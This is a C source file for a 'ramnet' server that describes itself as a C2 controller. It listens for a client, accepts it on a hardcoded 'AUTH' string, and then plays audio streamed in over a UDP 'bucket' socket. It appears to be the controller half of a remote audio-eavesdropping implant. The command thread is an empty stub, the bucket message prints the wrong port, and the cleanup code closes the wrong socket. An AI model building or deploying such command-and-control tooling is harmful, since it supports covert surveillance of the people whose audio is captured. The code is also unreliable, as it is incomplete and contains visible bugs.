/**
 * @file main.c
 * 
 * @brief Source for ramnet server/controller.
 */

#include <stdio.h>
#include <stdlib.h>
#include <pthread.h>
#include <netdb.h>
#include <unistd.h>
#include <signal.h>
#include <string.h>
#include <stdbool.h>

#include "../include/common/server.h"
#include "../include/common/audio.h"


#define IP_ADDR "0.0.0.0"
#define IP_PORT "5555"

volatile sig_atomic_t gb_shutdown  = 0;
volatile sig_atomic_t gb_connected = 0;


/* CTRL-C signal handler */
void
handle_sigint(int32_t sig)
{
    gb_shutdown = 1;
}

bool
auth_client(int64_t client_fd)
{
    bool ret_val = false;

    char p_buffer[16]  = { 0 };
    ssize_t buffer_len = 0;

    buffer_len = recv(client_fd, p_buffer, 15, 0);

    if (buffer_len < 4)
    {
        goto func_exit;
    }

    p_buffer[4] = 0; // Null terminate after expected 'AUTH'
    if (!strcmp(p_buffer, "AUTH"))
    {
        ret_val = true;
    }

func_exit:
    if (ret_val)
    {
        send(client_fd, "AUTH_OK", 8, 0);
    }
    else
    {
        send(client_fd, "AUTH_NO", 8, 0);
    }

    return ret_val;
}


void *
c2_thread(void * p_arg)
{
    int64_t client_fd = *(int64_t *)p_arg;

    char p_buffer[32]     = { 0 };
    char p_op_buffer[16]  = { 0 };
    char p_arg_buffer[16] = { 0 };
    ssize_t buffer_len    = 0;

    printf("[\033[31m*\033[0m] Thread creation: c2_thread(%zu)\n", client_fd);
}

void *
bucket_thread(void * p_arg)
{
    int64_t bucket_fd = *(int64_t *)p_arg;

    char p_buffer[4096] = { 0 };
    ssize_t buffer_len = -1;

    struct sockaddr_in client_addr = { 0 };
    socklen_t addr_len = sizeof(client_addr);

    audio_init();

    printf("[\033[31m*\033[0m] Thread creation: bucket_thread(%zu)\n", bucket_fd);

    while (!gb_shutdown && gb_connected)
    {
        buffer_len = recvfrom(bucket_fd, p_buffer, sizeof(p_buffer), 0,
                              (struct sockaddr *)&client_addr, &addr_len);

        if (buffer_len < 0)
        {
            fprintf(stderr, "ERROR: Failed to receive into bucket.\n");
            continue;
        }

        handle_audio(p_buffer, buffer_len);
    }

    audio_shutdown();
}


int
main(int argc, char ** pp_argv)
{
    /* Sigaction setup for CTRL-C termination */
    struct sigaction sa = { 0 };
    sa.sa_handler       = handle_sigint;
    sigemptyset(&sa.sa_mask);
    sigaction(SIGINT, &sa, NULL);

    /* Client and c2 socket setup */
    int64_t c2_fd     = -1;
    int64_t bucket_fd = -1;
    int64_t client_fd = -1;
    struct sockaddr_in client_addr = { 0 };
    socklen_t addr_len = sizeof(client_addr);

    /* Thread construction */
    pthread_t t_server_thread  = { 0 };
    pthread_t t_bucket_thread  = { 0 };

    while (!gb_shutdown)
    {
        /* Create C2 listener */
        c2_fd = create_tcp_listener(IP_ADDR, IP_PORT);
        if (c2_fd > 0)
        {
            printf("[\033[36m*\033[0m] C2 socket successfully created.\n"
            "[\033[36m*\033[0m] Listening on socket \033[36m%s:%s\033[0m [%zu].\n",
            IP_ADDR, IP_PORT, c2_fd);
        }
        else
        {
            fprintf(stderr, "ERROR: Failed to create C2 socket.\n");
            goto cleanup;
        }

        /* Wait for client connection */
        client_fd = accept(c2_fd, (struct sockaddr *)&client_addr, &addr_len);
        if (client_fd > 0)
        {
            printf("[\033[35m*\033[0m] Received initial client connection.\n");
            close(c2_fd);
            c2_fd = -1;
        }
        else
        {
            fprintf(stderr, "ERROR: Failed to accept client connection.\n");
            goto cleanup;
        }

        /* Authenticate client */
        if (auth_client(client_fd))
        {
            printf("[\033[35m*\033[0m] Client successfully authenticated.\n");
            gb_connected = 1;
            break;
        }
        else
        {
            printf("[\033[35m*\033[0m] Client failed to authenticate.\n");
            shutdown(client_fd, SHUT_RDWR);
            close(client_fd);
            client_fd = -1;
        }
    }

    if (gb_shutdown)
    {
        goto cleanup;
    }

    /* Create streaming bucket socket */
    bucket_fd = create_udp_listener(IP_ADDR, "5556");
    if (bucket_fd > 0)
    {
        printf("[\033[36m*\033[0m] Bucket socket successfully created.\n"
        "[\033[36m*\033[0m] Listening on socket \033[36m%s:%s\033[0m [%zu].\n",
        IP_ADDR, IP_PORT, bucket_fd);
    }
    else
    {
        fprintf(stderr, "ERROR: Failed to create bucket socket.\n");
        goto cleanup;
    }

    /* Launch TCP command and streaming bucket thread */
    if (pthread_create(&t_server_thread, NULL, c2_thread, &client_fd) != 0)
    {
        fprintf(stderr, "ERROR: Failed to launch C2 thread.\n");
        goto cleanup;
    }
    if (pthread_create(&t_bucket_thread, NULL, bucket_thread, &bucket_fd) != 0)
    {
        fprintf(stderr, "ERROR: Failed to launch bucket thread.\n");
        goto cleanup;
    }

    pthread_join(t_server_thread, NULL);
    pthread_join(t_bucket_thread, NULL);

cleanup:
    if (client_fd > 0)
    {
        shutdown(client_fd, SHUT_RDWR);
        close(client_fd);
    }

    if (bucket_fd > 0)
    {
        close(c2_fd);
    }

    if (c2_fd > 0)
    {
        close(c2_fd);
    }

    return 0;
}

/*** end of file ***/
